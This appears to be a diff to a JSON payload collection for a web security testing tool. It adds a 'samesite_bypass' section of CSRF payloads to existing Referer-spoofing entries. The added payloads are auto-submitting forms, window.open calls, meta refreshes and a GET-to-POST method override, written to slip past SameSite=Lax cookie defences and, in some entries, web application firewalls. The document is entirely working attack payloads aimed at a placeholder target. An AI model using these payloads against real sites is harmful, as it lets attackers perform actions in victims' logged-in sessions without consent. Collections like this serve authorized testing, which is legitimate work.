@@ -26,6 +26,16 @@
         {"payload": "Use Referer: https://target.com.attacker.com to bypass Referer-based CSRF protection", "description": "Referer header spoofing to bypass referer-only CSRF defenses", "waf_bypass": true},
         {"payload": "Omit Referer header entirely (Referrer-Policy: no-referrer in attacker page)", "description": "No Referer header may bypass Referer-only validation", "waf_bypass": true}
       ]
+    },
+    "samesite_bypass": {
+      "description": "Bypass SameSite=Lax cookie restrictions via top-level navigation and method override",
+      "payloads": [
+        {"payload": "<a href=\"TARGET_URL\">Click</a><script>document.querySelector('a').click()</script>", "description": "Top-level GET navigation — SameSite=Lax sends cookies", "waf_bypass": false},
+        {"payload": "<script>window.open('TARGET_URL')</script>", "description": "window.open top-level navigation bypass", "waf_bypass": false},
+        {"payload": "<meta http-equiv=\"refresh\" content=\"0;url=TARGET_URL\">", "description": "Meta refresh triggers top-level navigation", "waf_bypass": false},
+        {"payload": "<form method=GET action=TARGET_URL><input name=_method value=POST><input name=key value=evil></form><script>document.forms[0].submit()</script>", "description": "Method override GET→POST with Lax cookies", "waf_bypass": true},
+        {"payload": "<form method=POST action=TARGET_URL><input name=key value=evil></form><script>document.forms[0].submit()</script>", "description": "POST within 2-min Lax creation window (Chrome)", "waf_bypass": true}
+      ]
     }
   }
 }
